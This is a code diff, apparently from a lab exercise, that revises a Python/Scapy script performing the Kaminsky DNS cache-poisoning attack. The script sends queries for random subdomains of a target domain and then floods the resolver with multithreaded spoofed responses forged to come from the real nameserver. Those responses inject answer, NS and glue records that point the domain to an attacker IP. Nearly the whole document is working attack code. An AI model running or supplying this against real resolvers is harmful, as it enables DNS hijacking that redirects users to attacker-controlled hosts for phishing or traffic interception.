@@ -5,48 +5,47 @@ import threading
 from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1
 
 # --- Worker function for sending a single spoofed packet ---
-def send_spoofed_response(resolver_ip, real_ns_ip, target_domain, random_subdomain, attacker_ip, fake_ns_domain):
-    """Crafts and sends one spoofed DNS response packet."""
+def send_spoofed_response(resolver_ip, real_ns_ip, target_domain, specific_subdomain, attacker_ip, fake_ns_domain):
+    """Crafts and sends one spoofed DNS response packet for a specific subdomain."""
     spoofed_response = IP(src=real_ns_ip, dst=resolver_ip) / \
                        UDP(sport=53, dport=5000) / \
                        DNS(
                            id=random.randint(1, 65535),
                            qr=1, aa=1,
-                           qd=DNSQR(qname=random_subdomain),
-                           an=DNSRR(rrname=random_subdomain, ttl=86400, rdata=attacker_ip),
+                           qd=DNSQR(qname=specific_subdomain),  # Use the specific subdomain
+                           an=DNSRR(rrname=specific_subdomain, ttl=86400, rdata=attacker_ip),  # Use the specific subdomain
                            ns=DNSRR(rrname=target_domain, type='NS', ttl=86400, rdata=fake_ns_domain),
                            ar=DNSRR(rrname=fake_ns_domain, ttl=86400, rdata=attacker_ip)
                        )
     send(spoofed_response, verbose=0)
 
 def run_attack(resolver_ip, attacker_ip, real_ns_ip, target_domain, num_requests, num_responses):
-    """
-    Performs a single attempt of the Kaminsky attack using multithreading for the flood.
-    """
-    random_subdomain = str(random.randint(10000, 99999)) + "." + target_domain
     fake_ns_domain = "ns.attacker-lab.com"
-    print(f"[*]   Using random subdomain: {random_subdomain}")
-
-    print(f"[*]   Sending {num_requests} initial queries...")
-    for _ in range(num_requests):
-        query_packet = IP(dst=resolver_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=random_subdomain))
+    
+    for request_num in range(num_requests):
+        # Generate unique subdomain for this request
+        specific_subdomain = str(random.randint(10000, 99999)) + "." + target_domain
+        print(f"[*]   Request #{request_num + 1}: Using subdomain {specific_subdomain}")
+        
+        # Send query for this specific subdomain
+        query_packet = IP(dst=resolver_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=specific_subdomain))
         send(query_packet, verbose=0)
 
-    # --- Multithreaded Flood ---
-    print(f"[*]   Flooding with {num_responses} spoofed responses using threads...")
-    threads = []
-    for _ in range(num_responses):
-        # Create a thread for each packet
-        thread = threading.Thread(
-            target=send_spoofed_response,
-            args=(resolver_ip, real_ns_ip, target_domain, random_subdomain, attacker_ip, fake_ns_domain)
-        )
-        threads.append(thread)
-        thread.start()
+        # --- Multithreaded Flood ---
+        print(f"[*]   Flooding with {num_responses} spoofed responses using threads...")
+        threads = []
+        for _ in range(num_responses):
+            # Create a thread for each packet
+            thread = threading.Thread(
+                target=send_spoofed_response,
+                args=(resolver_ip, real_ns_ip, target_domain, specific_subdomain, attacker_ip, fake_ns_domain)
+            )
+            threads.append(thread)
+            thread.start()
 
-    # Wait for all threads to complete
-    for thread in threads:
-        thread.join()
+        # Wait for all threads to complete
+        for thread in threads:
+            thread.join()
 
 def verify_attack(resolver_ip, target_domain, attacker_ip):
     """
